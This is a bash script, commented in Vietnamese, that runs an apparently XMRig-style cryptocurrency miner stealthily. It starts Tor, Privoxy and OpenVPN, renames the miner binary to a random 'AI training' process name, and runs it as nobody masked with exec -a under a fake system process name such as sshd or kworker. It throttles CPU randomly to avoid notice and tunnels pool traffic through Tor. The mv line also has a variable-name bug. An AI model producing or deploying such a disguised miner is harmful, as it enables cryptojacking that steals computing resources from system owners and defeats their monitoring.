#!/bin/bash

# Khởi động dịch vụ Tor, Privoxy và VPN
service tor start
if ! pgrep -x "tor" > /dev/null; then
  echo "Tor service failed to start"
fi

service privoxy start
if ! pgrep -x "privoxy" > /dev/null; then
  echo "Privoxy service failed to start"
fi

openvpn --config $VPN_CONFIG &
if ! pgrep -x "openvpn" > /dev/null; then
  echo "OpenVPN service failed to start"
fi

# Tạo bản sao của file systemdd nếu chưa có
if [ ! -f /usr/sbin/systemdd_backup ]; then
  cp /usr/sbin/systemdd /usr/sbin/systemdd_backup
fi

# Kiểm tra và khởi động script đổi IP ngẫu nhiên nếu có
if [ -f /root/change_ip.sh ]; then
  /root/change_ip.sh &
fi

# Danh sách các tên tiến trình hệ thống hợp lệ để bọc
SYSTEM_PROCESS_NAMES=("systemd" "sshd" "cron" "bash" "kworker" "dbus-daemon")

# Chọn một tên tiến trình hệ thống hợp lệ ngẫu nhiên để bọc
RANDOM_SYSTEM_PROCESS=${SYSTEM_PROCESS_NAMES[$RANDOM % ${#SYSTEM_PROCESS_NAMES[@]}]}

# Danh sách các tên tiến trình liên quan đến AI training
AI_PROCESS_NAMES=("ai_trainer" "deep_learning_worker" "neural_net" "model_optimizer" "tensor_processor" "gpu_trainer")

# Chọn một tên tiến trình AI ngẫu nhiên từ danh sách
RANDOM_AI_NAME=${AI_PROCESS_NAMES[$RANDOM % ${#AI_PROCESS_NAMES[@]}]}

# Tạo số ngẫu nhiên
RANDOM_NUMBER=$(shuf -i 1000-9999 -n 1)

# Kết hợp tên tiến trình AI với số ngẫu nhiên để tạo tên cuối cùng
FINAL_NAME="${RANDOM_AI_NAME}-${RANDOM_NUMBER}"
echo $FINAL_NAME > /root/model.txt
mv /usr/sbin/systemdd /usr/sbin/$FINAL_NAMEdo

# Tính toán số threads dựa trên % CPU ngẫu nhiên
TOTAL_CORES=$(nproc)  # Xác định số CPU logic (bao gồm cả hyper-threading)
cpu_hint=$(shuf -i $CPU_MIN-$CPU_MAX -n 1)  # Phần trăm CPU sử dụng ngẫu nhiên
CPU_HINT=$(echo "($TOTAL_CORES * $cpu_hint) / 100" | bc)  # Tính số threads dựa trên % CPU và số core

# Phân bổ tiến trình trên nhiều core với taskset
CORE_SET=$(seq -s, 0 $(($TOTAL_CORES - 1)))  # Phân bổ trên tất cả các core logic

# Giới hạn tổng công suất từ 50% đến 90% với cpulimit
TOTAL_SYSTEM_POWER=$(($TOTAL_CORES * 100))  # Tổng công suất hệ thống (CPU logic x 100%)
CPU_LIMIT_PERCENT=$(shuf -i 50-90 -n 1)  # Lấy giá trị ngẫu nhiên từ 50% đến 90% công suất
CPU_LIMIT=$(($TOTAL_SYSTEM_POWER * $CPU_LIMIT_PERCENT / 100))  # Giới hạn công suất thực tế

# Khởi động tiến trình systemdd dưới quyền người dùng nobody và ngụy trang dưới tên tiến trình hệ thống
echo "Khởi động tiến trình với tên ngụy trang: $FINAL_NAME (được bọc dưới tên hệ thống: $RANDOM_SYSTEM_PROCESS)"
sudo -u nobody exec -a "$RANDOM_SYSTEM_PROCESS" cpulimit -l $CPU_LIMIT -- taskset -c $CORE_SET torsocks /usr/sbin/$FINAL_NAME --donate-level $DONATE -o $POOL -u $USERNAME -a $ALGO --no-huge-pages --cpu-max-threads-hint=$CPU_HINT --tls --proxy=socks5://127.0.0.1:9050

# Giữ tiến trình chạy
tail -f /dev/null
